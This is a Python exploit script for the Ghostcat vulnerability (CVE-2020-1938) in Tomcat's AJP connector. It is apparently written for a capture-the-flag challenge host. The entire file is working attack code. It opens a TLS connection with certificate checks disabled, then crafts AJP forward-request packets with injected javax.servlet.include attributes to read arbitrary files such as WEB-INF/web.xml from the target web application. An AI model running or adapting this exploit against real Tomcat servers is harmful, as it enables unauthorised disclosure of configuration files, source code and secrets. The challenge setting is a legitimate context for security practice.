#!/usr/bin/env python3
"""
Ghostcat (CVE-2020-1938) exploit for Tomcat 8.5.50 AJP connector over TLS.

The target exposes the AJP connector (default 8009) wrapped in TLS on :443.
Because AJP trusts whatever connects to it (normally the internal reverse
proxy), an attacker who can reach the connector can inject
`javax.servlet.include.*` request attributes and make Tomcat serve arbitrary
files from inside the web application (WEB-INF/web.xml, config, sources...).

Usage:
    python3 ajp_ghost.py read  <path>
    python3 ajp_ghost.py read  <path> <uri>
"""
import socket
import ssl
import sys
import struct

HOST = "kicyber-7d535cb35083-tomwantspeace1-0-1.chals.io"
PORT = 443
SNI = HOST

AJP13_FORWARD_REQUEST = 0x02


def _s(s):
    """AJP string: 2-byte big-endian length + bytes + NUL terminator."""
    if isinstance(s, str):
        s = s.encode()
    return struct.pack(">H", len(s)) + s + b"\x00"


class AjpClient:
    def __init__(self, host=HOST, port=PORT, use_tls=True, sni=SNI, timeout=15):
        self.host = host
        self.port = port
        raw = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            self.sock = ctx.wrap_socket(raw, server_hostname=sni)
        else:
            self.sock = raw

    def forward_request(self, method, uri, headers, attributes,
                         remote_addr="127.0.0.1", remote_host="127.0.0.1",
                         server_name="localhost", server_port=8080, is_ssl=False):
        body = struct.pack(">B", AJP13_FORWARD_REQUEST)
        body += struct.pack(">B", 2)    # method 2 = GET (AJP uses a code byte)
        body += _s("HTTP/1.1")
        body += _s(uri)                 # req_uri
        body += _s(remote_addr)
        body += _s(remote_host)
        body += _s(server_name)
        body += struct.pack(">H", server_port)
        body += struct.pack(">B", 1 if is_ssl else 0)
        # headers
        body += struct.pack(">H", len(headers))
        for k, v in headers:
            body += _s(k) + _s(v)
        # extra attributes: each is [code byte][name][value];
        # code 0x0A = SC_A_REQ_ATTRIBUTE (set an arbitrary request attribute)
        for k, v in attributes:
            body += b"\x0A" + _s(k) + _s(v)
        body += b"\xff"   # SC_A_ARE_DONE

        pkt = struct.pack(">HH", 0x1234, len(body)) + body
        self.sock.sendall(pkt)

    def _recv_exact(self, n):
        buf = b""
        while len(buf) < n:
            chunk = self.sock.recv(n - len(buf))
            if not chunk:
                raise EOFError("connection closed")
            buf += chunk
        return buf

    def _read_packet(self):
        magic = self._recv_exact(2)
        if magic not in (b"\x12\x34", b"\x41\x42"):
            raise ValueError("bad magic %r" % magic)
        (length,) = struct.unpack(">H", self._recv_exact(2))
        return self._recv_exact(length)

    @staticmethod
    def _read_ajp_string(payload, off):
        (slen,) = struct.unpack(">H", payload[off:off + 2])
        if slen == 0xFFFF:
            return None, off + 2
        s = payload[off + 2:off + 2 + slen].decode("latin-1")
        return s, off + 2 + slen

    def read_response(self):
        """Parse SEND_HEADERS + SEND_BODY_CHUNK packets -> (status, headers, body)."""
        body = b""
        status = None
        headers = []
        while True:
            try:
                pkt = self._read_packet()
            except (EOFError, ValueError):
                break
            if not pkt:
                break
            code = pkt[0]
            if code == 4:  # SEND_HEADERS
                (status,) = struct.unpack(">H", pkt[1:3])
                _, off = self._read_ajp_string(pkt, 3)
                (n,) = struct.unpack(">H", pkt[off:off + 2])
                off += 2
                for _ in range(n):
                    k, off = self._read_ajp_string(pkt, off)
                    v, off = self._read_ajp_string(pkt, off)
                    headers.append((k, v))
            elif code == 3:  # SEND_BODY_CHUNK
                (clen,) = struct.unpack(">H", pkt[1:3])
                body += pkt[3:3 + clen]
            elif code == 5:  # END_RESPONSE
                break
            else:
                break
        return status, headers, body


def read_file(path, uri="/"):
    c = AjpClient()
    attributes = [
        ("javax.servlet.include.request_uri", uri),
        ("javax.servlet.include.path_info", path),
        ("javax.servlet.include.servlet_path", uri),
    ]
    headers = [("Host", "localhost"), ("Connection", "close")]
    c.forward_request("GET", uri, headers, attributes)
    return c.read_response()


if __name__ == "__main__":
    if len(sys.argv) < 3 or sys.argv[1] != "read":
        print(__doc__)
        sys.exit(1)
    path = sys.argv[2]
    uri = sys.argv[3] if len(sys.argv) > 3 else "/"
    status, hdrs, body = read_file(path, uri)
    sys.stderr.write("status=%s headers=%s\n" % (status, hdrs))
    sys.stdout.buffer.write(body)
